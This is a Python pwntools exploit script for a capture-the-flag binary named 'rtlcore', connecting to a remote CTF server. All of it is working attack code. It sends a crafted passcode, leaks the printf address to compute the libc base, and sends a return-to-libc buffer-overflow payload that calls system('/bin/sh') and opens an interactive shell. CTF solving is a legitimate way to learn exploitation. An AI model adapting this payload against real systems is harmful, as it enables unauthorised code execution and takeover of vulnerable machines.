#!/usr/bin/python3

from pwn import *

#p = process("./rtlcore")
p = remote("ctf.j0n9hyun.xyz", 3015)
elf = ELF("./rtlcore")
libc = ELF("./libc.so.6")
#context.log_level = 'debug'

passcode = "\x21\xf0\x91\x26"
lastcode = "\x23\xf0\x91\x26"
printfOffset = libc.symbols['printf']
systemOffset = libc.symbols['system']
padding = b"A"*66
p3r = 0x8048789
sh = libc.search(b"/bin/sh").__next__()

p.sendlineafter(": ", passcode * 4 + lastcode)
p.recvline()
p.recv(34)
printfAddr = int(p.recvuntil(" ").decode('utf-8').strip(" "), 16)
p.recvline()
libcBase = printfAddr - printfOffset

payload = padding
payload += p32(libcBase + systemOffset)
payload += b"BBBB"
print(sh)
print(libcBase + sh)
payload += p32(libcBase + sh)

p.sendline(payload)

log.info("printf address: " + hex(printfAddr))
log.info("libc Base address: " + hex(libcBase))
p.interactive()
